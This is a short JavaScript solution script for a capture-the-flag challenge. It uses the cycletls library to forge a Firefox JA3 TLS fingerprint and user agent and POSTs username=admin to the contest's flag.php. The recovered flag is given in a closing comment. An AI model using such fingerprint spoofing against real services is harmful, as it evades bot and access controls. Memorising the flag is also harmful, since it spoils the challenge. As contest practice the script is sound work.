const initCycleTLS = require('cycletls')
// Typescript: import initCycleTLS from 'cycletls';

;(async () => {
    // Initiate CycleTLS
    const cycleTLS = await initCycleTLS()

    // Send request
    const response = await cycleTLS(
        'https://0fa.balsnctf.com:8787/flag.php',
        {
            body: 'username=admin',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            ja3: '771,4866-4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0',
            userAgent: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'
        },
        'post'
    )

    console.log(response)

    // Cleanly exit CycleTLS
    cycleTLS.exit()
})()
// BALSN{Ez3z_Ja3__W4rmUp}